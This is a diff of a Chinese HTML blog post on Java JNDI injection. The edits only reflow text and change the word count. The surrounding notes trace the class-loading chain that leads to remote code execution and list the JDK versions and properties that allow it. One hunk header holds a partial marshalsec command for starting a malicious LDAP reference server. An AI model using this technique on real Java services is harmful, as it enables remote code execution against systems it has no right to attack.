@@ -956,8 +956,8 @@ RemoteReference.getReferece() # 远程加载类factory
 
 NamingManager.getObjectInstance() # 
 NamingManager.getObjectFactoryFromReference -> factory newInstance调用静态方法
-或重载的函数
-factory.getObjectInstance() 触发RCE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+或重载的函数factory.getObjectInstance() 触发RCE<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里的利用条件是解决了 <strong>java版本应低于7u21、6u45，或者需要设置java.rmi.server.useCodebaseOnly=false系统属性</strong>的限制实现RMI Remote Object Codebase类加载。RemoteReference.getReferece() 是通过URLClassLoader进行远程类加载</p>
 <p>但在JDK 6u132, JDK 7u122, JDK 8u113版本中，<strong>系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false</strong>，即默认不允许从远程的Codebase加载Reference工厂类。这里包括下载的LDAP 通过Reference实现远程Factory加载的JNDI攻击不在适用。 </p>
 <p>一个JNDI 注入利用的总结</p>
@@ -1825,7 +1825,7 @@ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">44.1k</span> 字
+                <span class="white-color">44.2k</span> 字
             
 
             
